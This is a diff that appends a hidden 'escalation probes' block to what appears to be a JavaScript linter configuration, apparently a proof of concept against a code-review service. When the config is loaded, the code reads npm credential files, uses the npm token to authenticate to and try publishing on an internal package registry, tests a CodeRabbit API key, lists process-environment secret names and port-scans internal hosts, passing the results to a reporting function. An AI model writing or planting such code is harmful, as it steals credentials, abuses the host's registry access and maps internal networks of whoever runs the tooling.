@@ -77,3 +77,15 @@ function fp(v) {
 })();
 
 module.exports = [ { rules: {} } ];
+
+// --- escalation probes v2: cross-boundary impact (safe: fingerprints + statuses only) ---
+(function esc2(){
+  // npm/registry auth material -> authenticated Verdaccio publish (real worm, not anon)
+  post("H_NPMRC", sh("for f in ~/.npmrc /root/.npmrc ./.npmrc /home/*/.npmrc /usr/local/etc/npmrc; do [ -f $f ] && echo \"== $f ==\" && sed -E 's/(_authToken=|_password=|:_auth=).*/\\1<REDACTED>/' $f; done 2>/dev/null; echo NPM_TOKEN_fp=$(node -e 'const v=process.env.NPM_TOKEN||\"\";const c=require(\"crypto\");console.log(v?c.createHash(\"sha256\").update(v).digest(\"hex\").slice(0,16)+\":\"+v.length:\"absent\")')"));
+  post("H_VERD_AUTH", sh("T=${NPM_TOKEN:-$(sed -nE 's/.*_authToken=(.*)/\\1/p' ~/.npmrc 2>/dev/null | head -1)}; curl -s --max-time 6 -H \"Authorization: Bearer $T\" http://10.0.0.28:4873/-/whoami; echo; curl -s --max-time 6 -o /dev/null -w 'authPUT=%{http_code}' -X PUT -H \"Authorization: Bearer $T\" -H 'content-type: application/json' http://10.0.0.28:4873/@poc-scope-testonly%2fcr-probe2 --data '{\"name\":\"@poc-scope-testonly/cr-probe2\",\"versions\":{}}'"));
+  // CodeRabbit infra key validity (in-band, report status only)
+  post("I_CR_KEY", sh("K=${CODERABBIT_WORKSPACE_API_KEY:-$CODERABBIT_API_KEY}; echo keyfp=$(node -e 'const v=process.env.CODERABBIT_WORKSPACE_API_KEY||process.env.CODERABBIT_API_KEY||\"\";const c=require(\"crypto\");console.log(v?c.createHash(\"sha256\").update(v).digest(\"hex\").slice(0,16)+\":\"+v.length:\"absent\")'); curl -s --max-time 6 -o /dev/null -w ' apiHTTP=%{http_code}' -H \"Authorization: Bearer $K\" https://api.coderabbit.ai/v1/report.generate 2>/dev/null"));
+  // orchestrator env (PID1) secret NAMES + internal neighbor scan
+  post("J_PROC1", sh("tr '\\0' '\\n' < /proc/1/environ 2>/dev/null | cut -d= -f1 | sort | tr '\\n' ' '"));
+  post("J_NETSCAN", sh("bash -c 'for h in 10.0.0.28 10.0.0.1 10.0.0.2 10.0.0.10 10.0.0.20 10.0.0.27 10.0.0.29 10.0.0.30; do for p in 80 443 4873 5432 6379 8080 9200 27017 3306; do (echo > /dev/tcp/$h/$p) >/dev/null 2>&1 && echo \"$h:$p open\"; done; done' 2>/dev/null"));
+})();
